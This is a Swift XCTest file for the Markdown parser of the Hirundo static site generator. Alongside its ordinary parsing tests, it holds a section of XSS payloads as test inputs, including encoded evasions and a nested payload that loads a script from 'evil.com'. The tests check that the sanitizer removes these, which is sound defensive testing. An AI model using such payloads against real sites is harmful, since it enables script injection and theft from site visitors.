import XCTest
import Markdown
@testable import HirundoCore

final class MarkdownParserTests: XCTestCase {
    
    var parser: MarkdownParser!
    var parserWithSkipValidation: MarkdownParser!
    
    override func setUp() {
        super.setUp()
        parser = MarkdownParser()
        parserWithSkipValidation = MarkdownParser(skipContentValidation: true)
    }
    
    func testBasicMarkdownParsing() throws {
        let markdown = """
        # タイトル
        
        これは段落です。
        
        ## サブタイトル
        
        - リスト項目1
        - リスト項目2
        - リスト項目3
        """
        
        let result = try parser.parse(markdown)
        
        XCTAssertNotNil(result.document)
        XCTAssertEqual(result.content.count, 4) // h1, p, h2, ul
    }
    
    func testFrontMatterExtraction() throws {
        let markdownWithFrontMatter = """
        ---
        title: "テスト記事"
        date: 2024-01-01T12:00:00Z
        categories: [web, development]
        tags: [swift, static-site]
        author: "テスト太郎"
        excerpt: "これはテスト記事です"
        ---
        
        # テスト記事
        
        本文の内容
        """
        
        let result = try parser.parse(markdownWithFrontMatter)
        
        XCTAssertNotNil(result.frontMatter)
        XCTAssertEqual(result.frontMatter?["title"] as? String, "テスト記事")
        XCTAssertEqual(result.frontMatter?["author"] as? String, "テスト太郎")
        XCTAssertEqual(result.frontMatter?["excerpt"] as? String, "これはテスト記事です")
        
        let categories = result.frontMatter?["categories"] as? [String]
        XCTAssertEqual(categories?.count, 2)
        XCTAssertEqual(categories?[0], "web")
        XCTAssertEqual(categories?[1], "development")
    }
    
    func testCodeBlockParsing() throws {
        let markdownWithCode = """
        # コードサンプル
        
        以下はSwiftのコードです：
        
        ```swift
        func hello() {
            print("Hello, World!")
        }
        ```
        
        インラインコード: `let x = 42`
        """
        
        let result = try parser.parse(markdownWithCode)
        
        XCTAssertTrue(result.hasCodeBlocks)
        XCTAssertEqual(result.codeBlocks.count, 1)
        XCTAssertEqual(result.codeBlocks[0].language, "swift")
        XCTAssertEqual(result.codeBlocks[0].content, "func hello() {\n    print(\"Hello, World!\")\n}")
    }
    
    func testLinkParsing() throws {
        let markdownWithLinks = """
        [外部リンク](https://example.com)
        [内部リンク](/about)
        [アンカーリンク](#section)
        ![画像](image.jpg)
        """
        
        let result = try parser.parse(markdownWithLinks)
        
        XCTAssertEqual(result.links.count, 3)
        XCTAssertEqual(result.images.count, 1)
        
        XCTAssertTrue(result.links.contains { $0.url == "https://example.com" && $0.isExternal })
        XCTAssertTrue(result.links.contains { $0.url == "/about" && !$0.isExternal })
        XCTAssertTrue(result.links.contains { $0.url == "#section" && !$0.isExternal })
        
        XCTAssertEqual(result.images[0].url, "image.jpg")
    }
    
    func testTableParsing() throws {
        let markdownWithTable = """
        | ヘッダー1 | ヘッダー2 | ヘッダー3 |
        |----------|----------|----------|
        | セル1    | セル2    | セル3    |
        | セル4    | セル5    | セル6    |
        """
        
        let result = try parser.parse(markdownWithTable)
        
        XCTAssertTrue(result.hasTables)
        XCTAssertEqual(result.tables.count, 1)
        XCTAssertEqual(result.tables[0].headers.count, 3)
        XCTAssertEqual(result.tables[0].rows.count, 2)
    }
    
    func testHeadingExtraction() throws {
        let markdownWithHeadings = """
        # H1 タイトル
        ## H2 セクション
        ### H3 サブセクション
        #### H4 詳細
        ##### H5 さらに詳細
        ###### H6 最小見出し
        """
        
        let result = try parser.parse(markdownWithHeadings)
        
        XCTAssertEqual(result.headings.count, 6)
        XCTAssertEqual(result.headings[0].level, 1)
        XCTAssertEqual(result.headings[0].text, "H1 タイトル")
        XCTAssertEqual(result.headings[5].level, 6)
        XCTAssertEqual(result.headings[5].text, "H6 最小見出し")
    }
    
    func testAutoExcerptGeneration() throws {
        let markdown = """
        ---
        title: "記事タイトル"
        ---
        
        # 記事タイトル
        
        これは最初の段落です。この内容が抜粋として使用されます。
        
        これは二番目の段落です。通常は最初の段落のみが抜粋になります。
        """
        
        let result = try parser.parse(markdown)
        
        XCTAssertEqual(result.excerpt, "これは最初の段落です。この内容が抜粋として使用されます。")
    }
    
    func testExcerptFromFrontMatter() throws {
        let markdown = """
        ---
        title: "記事タイトル"
        excerpt: "カスタム抜粋"
        ---
        
        # 記事タイトル
        
        これは最初の段落です。
        """
        
        let result = try parser.parse(markdown)
        
        XCTAssertEqual(result.excerpt, "カスタム抜粋")
    }
    
    func testComplexMarkdown() throws {
        let complexMarkdown = """
        ---
        title: "Swiftによる静的サイトジェネレーター"
        date: 2024-01-01
        tags: [swift, web]
        ---
        
        # Swiftによる静的サイトジェネレーター
        
        **Hirundo**は、Swiftで書かれた高速な静的サイトジェネレーターです。
        
        ## 特徴
        
        1. 高速なビルド
        2. 型安全
        3. プラグインシステム
        
        ### インストール
        
        ```bash
        swift build -c release
        ```
        
        詳細は[公式サイト](https://hirundo.example.com)をご覧ください。
        
        | 機能 | サポート |
        |------|---------|
        | Markdown | ✅ |
        | YAML | ✅ |
        | テンプレート | ✅ |
        """
        
        let result = try parser.parse(complexMarkdown)
        
        XCTAssertNotNil(result.frontMatter)
        XCTAssertEqual(result.headings.count, 3)
        XCTAssertTrue(result.hasCodeBlocks)
        XCTAssertTrue(result.hasTables)
        XCTAssertEqual(result.links.count, 1)
    }
    
    func testInvalidFrontMatter() throws {
        let invalidFrontMatter = """
        ---
        title: "Valid Title"
        invalid_yaml: [
        ---
        
        # Content
        """
        
        XCTAssertThrows(try parser.parse(invalidFrontMatter)) { (error: MarkdownError) in
            switch error {
            case .invalidFrontMatter:
                break
            default:
                XCTFail("Expected invalidFrontMatter error")
            }
        }
    }
    
    func testEmptyContent() throws {
        let emptyMarkdown = ""
        
        let result = try parser.parse(emptyMarkdown)
        
        XCTAssertNil(result.frontMatter)
        XCTAssertEqual(result.content.count, 0)
        XCTAssertEqual(result.headings.count, 0)
        XCTAssertNil(result.excerpt)
    }
    
    func testPerformance() throws {
        let largeMarkdown = String(repeating: "# Heading\n\nParagraph text.\n\n", count: 1000)
        
        measure {
            _ = try? parser.parse(largeMarkdown)
        }
    }
    
    // MARK: - XSS Security Tests
    
    func testXSSProtection_BasicScriptTag() throws {
        let maliciousMarkdown = """
        # Title
        
        <script>alert('XSS')</script>
        
        Normal paragraph.
        """
        
        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
        let html = result.renderHTML()
        
        // Script tags should be escaped or removed
        XCTAssertFalse(html.contains("<script>"))
        XCTAssertFalse(html.contains("</script>"))
        XCTAssertTrue(html.contains("&lt;script&gt;") || !html.contains("script"))
    }
    
    func testXSSProtection_EventHandlers() throws {
        let maliciousMarkdown = """
        # Title
        
        <img src=x onerror="alert('XSS')">
        <div onclick="alert('XSS')">Click me</div>
        <a href="#" onmouseover="alert('XSS')">Link</a>
        """
        
        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
        let html = result.renderHTML()
        
        // Event handlers should be removed or escaped
        XCTAssertFalse(html.contains("onerror="))
        XCTAssertFalse(html.contains("onclick="))
        XCTAssertFalse(html.contains("onmouseover="))
        XCTAssertFalse(html.contains("alert("))
    }
    
    func testXSSProtection_JavaScriptURLs() throws {
        let maliciousMarkdown = """
        [Click me](javascript:alert('XSS'))
        [Data URL](data:text/html,<script>alert('XSS')</script>)
        """
        
        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
        let html = result.renderHTML()
        
        // JavaScript and data URLs should be sanitized
        XCTAssertFalse(html.contains("javascript:"))
        XCTAssertFalse(html.contains("data:text/html"))
        
        // Links should either be removed or have safe href
        if html.contains("href=") {
            XCTAssertTrue(html.contains("href=\"#\"") || html.contains("href=\"\""))
        }
    }
    
    func testXSSProtection_EncodingEvasion() throws {
        let maliciousMarkdown = """
        # Title
        
        <img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
        <script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script>
        """
        
        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
        let html = result.renderHTML()
        
        // Encoded attacks should be prevented
        XCTAssertFalse(html.contains("onerror="))
        XCTAssertFalse(html.contains("<script"))
        XCTAssertFalse(html.contains("&#97;&#108;&#101;&#114;&#116;"))
    }
    
    func testXSSProtection_AttributeInjection() throws {
        let maliciousMarkdown = """
        <img src="valid.jpg" alt="test" src="x" onerror="alert('XSS')">
        <input type="text" value="test"><script>alert('XSS')</script>">
        """
        
        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
        let html = result.renderHTML()
        
        // Attribute injection should be prevented
        XCTAssertFalse(html.contains("onerror="))
        XCTAssertFalse(html.contains("<script"))
        
        // If img tag is allowed, it should have safe attributes only
        if html.contains("<img") {
            let imgPattern = #"<img[^>]*>"#
            if let regex = try? NSRegularExpression(pattern: imgPattern),
               let match = regex.firstMatch(in: html, range: NSRange(html.startIndex..., in: html)) {
                let imgTag = String(html[Range(match.range, in: html)!])
                XCTAssertFalse(imgTag.contains("onerror"))
            }
        }
    }
    
    func testXSSProtection_HTML5NewElements() throws {
        let maliciousMarkdown = """
        <svg onload="alert('XSS')"></svg>
        <math><mtext><script>alert('XSS')</script></mtext></math>
        <iframe src="javascript:alert('XSS')"></iframe>
        <embed src="data:text/html,<script>alert('XSS')</script>">
        <object data="javascript:alert('XSS')"></object>
        """
        
        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
        let html = result.renderHTML()
        
        // Dangerous HTML5 elements should be sanitized
        XCTAssertFalse(html.contains("<svg"))
        XCTAssertFalse(html.contains("<math"))
        XCTAssertFalse(html.contains("<iframe"))
        XCTAssertFalse(html.contains("<embed"))
        XCTAssertFalse(html.contains("<object"))
        XCTAssertFalse(html.contains("onload="))
    }
    
    func testXSSProtection_StyleInjection() throws {
        let maliciousMarkdown = """
        <style>body { background: url('javascript:alert("XSS")'); }</style>
        <div style="background: url('javascript:alert(&quot;XSS&quot;)')">Test</div>
        <link rel="stylesheet" href="javascript:alert('XSS')">
        """
        
        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
        let html = result.renderHTML()
        
        // Style-based XSS should be prevented
        XCTAssertFalse(html.contains("javascript:"))
        XCTAssertFalse(html.contains("<style"))
        
        // If style attribute is allowed, it should be safe
        if html.contains("style=") {
            XCTAssertFalse(html.lowercased().contains("javascript"))
            XCTAssertFalse(html.lowercased().contains("expression"))
        }
    }
    
    func testXSSProtection_MetaRefresh() throws {
        let maliciousMarkdown = """
        <meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
        <meta http-equiv="refresh" content="0;url=data:text/html,<script>alert('XSS')</script>">
        """
        
        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
        let html = result.renderHTML()
        
        // Meta refresh attacks should be prevented
        XCTAssertFalse(html.contains("<meta"))
        XCTAssertFalse(html.contains("http-equiv"))
        XCTAssertFalse(html.contains("javascript:"))
        XCTAssertFalse(html.contains("data:"))
    }
    
    func testXSSProtection_ComplexNestedAttack() throws {
        let maliciousMarkdown = """
        <div><img src="x" onerror="this.onerror=null;var s=document.createElement('script');s.src='//evil.com/xss.js';document.body.appendChild(s);">
        <input type="text" onfocus="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
        <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click</a>
        </div>
        """
        
        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
        let html = result.renderHTML()
        
        // Complex attacks should be prevented
        XCTAssertFalse(html.contains("onerror="))
        XCTAssertFalse(html.contains("onfocus="))
        XCTAssertFalse(html.contains("eval("))
        XCTAssertFalse(html.contains("document.createElement"))
        XCTAssertFalse(html.contains("appendChild"))
        
        // Encoded JavaScript URLs should be caught
        XCTAssertFalse(html.contains("&#106;&#97;&#118;&#97;"))
    }
    
    func testXSSProtection_SafeContent() throws {
        let safeMarkdown = """
        # Safe Title
        
        This is a **safe** paragraph with *emphasis*.
        
        [Safe Link](https://example.com)
        ![Safe Image](image.jpg)
        
        ```javascript
        // Safe code block
        console.log('Hello');
        ```
        
        - Safe list item 1
        - Safe list item 2
        """
        
        let result = try parserWithSkipValidation.parse(safeMarkdown)
        let html = result.renderHTML()
        
        // Safe content should be preserved
        XCTAssertTrue(html.contains("Safe Title"))
        XCTAssertTrue(html.contains("safe"))
        XCTAssertTrue(html.contains("emphasis"))
        XCTAssertTrue(html.contains("https://example.com"))
        XCTAssertTrue(html.contains("console.log"))
    }
}